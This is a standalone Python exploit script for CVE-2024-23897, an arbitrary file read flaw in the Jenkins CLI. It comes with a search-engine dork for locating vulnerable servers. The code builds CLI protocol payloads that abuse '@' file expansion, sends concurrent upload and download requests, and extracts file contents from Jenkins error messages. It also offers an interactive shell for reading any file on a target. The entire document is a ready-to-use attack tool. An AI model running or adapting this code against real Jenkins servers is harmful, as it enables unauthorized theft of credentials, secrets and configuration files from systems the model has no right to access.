# Exploit Title: CVE-2024-23897: Jenkins File Read Vulnerability
# Fofa Dork: header="X-Jenkins: 2.426.2" 
# Date: 2024-09-22
# Exploit Author: VeryLazyTech
# GitHub: https://github.com/verylazytech/CVE-2024-23897
# Vendor Homepage: https://www.jenkins.io/
# Software Link: https://www.jenkins.io/
# Version: Jenkins versions up to 2.441 && Jenkins LTS versions up to 2.426.2
# CVE: CVE-2024-23897


#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# Imports
import argparse
from cmd import Cmd
import os
import re
import requests
import struct
import threading
import time
import urllib.parse
import uuid
import random
from colorama import Fore, Style


# Constants
ENDC = "\033[0m"
ENCODING = "UTF-8"
COLORS = [Fore.GREEN, Fore.CYAN, Fore.BLUE]

def banner():
    random_color = random.choice(COLORS)
    return f"""{Style.BRIGHT}{random_color}
  ______     _______   ____   ___ ____  _  _     ____  _____  ___  ___ _____ 
 / ___\ \   / / ____| |___ \ / _ \___ \| || |   |___ \|___ / ( _ )/ _ \___  |
| |    \ \ / /|  _|     __) | | | |__) | || |_    __) | |_ \ / _ \ (_) | / / 
| |___  \ V / | |___   / __/| |_| / __/|__   _|  / __/ ___) | (_) \__, |/ /  
 \____|  \_/  |_____| |_____|\___/_____|  |_|   |_____|____/ \___/  /_//_/   
                                                                             
__     __                _                      _____         _     
\ \   / /__ _ __ _   _  | |    __ _ _____   _  |_   _|__  ___| |__  
 \ \ / / _ \ '__| | | | | |   / _` |_  / | | |   | |/ _ \/ __| '_ \ 
  \ V /  __/ |  | |_| | | |__| (_| |/ /| |_| |   | |  __/ (__| | | |
   \_/ \___|_|   \__, | |_____\__,_/___|\__, |   |_|\___|\___|_| |_|
                 |___/                  |___/                       
                 
                    {Style.BRIGHT}{Fore.WHITE}@VeryLazyTech - Medium {Style.RESET_ALL}\n
{Style.RESET_ALL}
"""

print(banner())
                                                                                     

class File_Terminal(Cmd):
    """This class provides a terminal prompt for file read attempts."""

    intro = "Welcome to the VeryLazyTech file-read shell. Type help or ? to list commands.\n"
    prompt = "VeryLazyTech> "
    file = None

    def __init__(self, read_file_func):
        self.read_file = read_file_func
        super().__init__()

    def do_cat(self, file_path):
        """Retrieve file contents."""
        self.read_file(file_path)

    def do_exit(self, *args):
        """Exit the terminal."""
        return True

    default = do_cat


class Op:
    ARG = 0
    LOCALE = 1
    ENCODING = 2
    START = 3
    EXIT = 4
    STDIN = 5
    END_STDIN = 6
    STDOUT = 7
    STDERR = 8


def send_upload_request(uuid_str, file_path):
    time.sleep(0.3)

    try:
        # Construct payload
        data = (
            jenkins_arg("connect-node", Op.ARG)
            + jenkins_arg("@" + file_path, Op.ARG)
            + jenkins_arg(ENCODING, Op.ENCODING)
            + jenkins_arg("en", Op.LOCALE)
            + jenkins_arg("", Op.START)
        )

        # Send upload request
        r = requests.post(
            url=f"{args.url}/cli?remoting=false",
            headers={
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
                "Session": uuid_str,
                "Side": "upload",
                "Content-type": "application/octet-stream",
            },
            data=data,
            proxies=proxies,
            timeout=timeout,
        )
        r.raise_for_status()  # Raise an error for bad responses

    except requests.exceptions.Timeout:
        print(f"{Fore.RED}Request timed out{ENDC}")
        return False
    except requests.exceptions.RequestException as e:
        print(f"{Fore.RED}Request error: {e}{ENDC}")
        return False



def jenkins_arg(string, operation) -> bytes:
    out_bytes = b"\x00\x00"
    out_bytes += struct.pack(">H", len(string) + 2)
    out_bytes += bytes([operation])
    out_bytes += struct.pack(">H", len(string))
    out_bytes += string.encode("UTF-8")
    return out_bytes


def safe_filename(path):
    # Get the basename of the path
    safe_path = path.replace("/", "_")
    # Replace non-alphanumeric characters (except underscores) with underscores
    safe_name = "".join(c if c.isalnum() or c == "_" else "_" for c in safe_path)
    return safe_name


def send_download_request(uuid_str, file_path):
    file_contents = b""
    try:
        # Send download request
        r = requests.post(
            url=args.url + "/cli?remoting=false",
            headers={"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0", "Session": uuid_str, "Side": "download"},
            proxies=proxies,
            timeout=timeout,
        )

        # Parse response content
        response = r.content.strip(b"\x00")
        if response:
            if b"No such file:" in response:
                print("File does not exist")
                return False
            elif b"No such agent" in response:
                matches = re.findall(b'No such agent "(.*?)"', response)
                if matches:
                    file_contents = b"\n".join(matches)

    except requests.exceptions.Timeout:
        print(f"{Fore.RED}Request timed out{ENDC}")
        return False
    except Exception as e:
        print(f"{Fore.RED}Error in download request:{ENDC} {str(e)}")
        return False

    # Save file
    if args.save:
        safe_path = safe_filename(file_path).strip("_")
        if not os.path.exists(safe_path) or args.overwrite:
            with open(safe_path, "wb") as f:
                f.write(file_contents)
            if args.verbose:
                print(f"[*] File saved to {safe_path}")
        else:
            if args.verbose:
                print(f"[*] File already saved to {safe_path}")

    # Print contents
    if file_contents:
        if isinstance(file_contents, bytes):
            print(file_contents.decode(ENCODING, errors="ignore").replace("\x00", "\n").strip())
        else:
            print(file_contents.replace("\x00", "\n").strip())
    else:
        print("<empty>")

    return True


def read_file(file_path):
    # Create random UUID
    uuid_str = str(uuid.uuid4())

    # Send upload/download requests
    upload_thread = threading.Thread(target=send_upload_request, args=(uuid_str, file_path))
    download_thread = threading.Thread(target=send_download_request, args=(uuid_str, file_path))
    upload_thread.start()
    download_thread.start()
    upload_thread.join()
    download_thread.join()


if __name__ == "__main__":
    # Parse arguments
    parser = argparse.ArgumentParser(description="POC for CVE-2024-23897 (Jenkins file read)")
    parser.add_argument("-u", "--url", required=True, help="Jenkins URL")
    parser.add_argument("-f", "--file", help="File path to read")
    parser.add_argument("-t", "--timeout", type=int, default=3, help="Request timeout")
    parser.add_argument("-s", "--save", action="store_true", help="Save file contents")
    parser.add_argument("-o", "--overwrite", action="store_true", help="Overwrite existing files")
    parser.add_argument("-p", "--proxy", help="HTTP(s) proxy to use")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbosity enabled")
    args = parser.parse_args()

    # Input-checking
    if not args.url.startswith(("http://", "https://")):
        args.url = "http://" + args.url
    args.url = urllib.parse.urlparse(args.url).geturl()
    proxies = {"http": args.proxy, "https": args.proxy} if args.proxy else {}
    timeout = args.timeout


    # Execute
    if args.file:
        read_file(args.file)
    else:
        File_Terminal(read_file).cmdloop()
